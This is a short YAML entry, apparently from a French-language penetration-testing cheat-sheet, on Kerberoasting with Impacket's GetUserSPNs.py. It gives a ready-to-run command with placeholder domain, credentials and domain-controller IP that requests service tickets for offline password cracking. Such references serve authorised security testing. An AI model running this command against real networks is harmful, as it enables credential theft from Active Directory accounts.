---
description: |
  GetUserSPNs.py d'Impacket tente de récupérer les Service Principal Names qui sont associés à des comptes d'utilisateurs normaux. Ce qui est retourné est un ticket crypté avec le mot de passe du compte utilisateur, qui peut ensuite être forcé hors ligne.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
items:
  - Password
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
